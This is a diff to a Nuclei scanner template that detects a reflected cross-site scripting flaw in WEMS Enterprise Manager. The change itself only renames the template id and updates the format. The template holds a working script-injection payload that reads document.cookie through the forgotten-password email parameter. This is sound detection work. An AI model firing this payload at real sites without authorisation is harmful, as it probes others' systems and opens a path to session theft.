@@ -1,11 +1,12 @@
-id: WEMS XSS
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: WEMS-XSS
 
 info:
   name: WEMS Enterprise Manager XSS
   author: pikpikcu
   severity: medium
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/guest/users/forgotten?email="><script>confirm(document.cookie)</script>'
